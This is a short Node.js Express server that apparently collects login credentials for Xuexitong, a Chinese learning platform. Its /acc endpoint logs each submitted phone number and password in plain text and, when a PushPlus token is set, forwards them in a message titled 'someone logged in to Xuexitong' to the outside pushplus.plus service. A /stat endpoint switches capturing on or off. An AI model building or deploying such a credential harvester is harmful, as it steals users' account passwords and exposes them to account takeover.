const express = require('express')
const bodyParser = require('body-parser')
const axios = require('axios')
// status控制是否进行抓取，1为抓，0为不抓
const STATUS = '1'
// 你的pushplus的token，填写此项会同步推送到pushplus，不然只会输出到终端
const PUSHPLUS_TOKEN = ''

const app = express()
app.use(bodyParser.urlencoded({ extended: true }))
app.use(bodyParser.json())

app.all('*', function (req, res, next) {
  res.header('Access-Control-Allow-Origin', '*')
  res.header('Access-Control-Allow-Headers', '*')
  res.header('Content-Type', 'application/json;charset=utf-8')
  res.header('Access-Control-Allow-Methods', 'PUT, POST, GET, DELETE, OPTIONS')
  next()
})

app.post('/acc', (req, res) => {
  const { Tel, pwd } = req.body

  // 在这里可以处理接收到的数据
  console.log('Tel:', Tel)
  console.log('pwd:', pwd)

  // 返回响应
  res.send('Data received successfully!')
  if (PUSHPLUS_TOKEN) {
    // 构建 GET 请求的 URL
    const url = `http://www.pushplus.plus/send?token=${PUSHPLUS_TOKEN}&title=有人登录了学习通&content=账号：${Tel}，密码：${pwd}&template=html`

    axios
      .get(url)
      .then((response) => {
        console.log('pushplus request successful')
      })
      .catch((error) => {
        console.error('Error sending pushplus request:', error)
      })
  }
})

app.get('/stat', (req, res) => {
  const responseJson = { status: STATUS }
  res.json(responseJson)
})

// 启动服务器
app.listen(3000, () => {
  console.log('Server is running on port 3000')
})
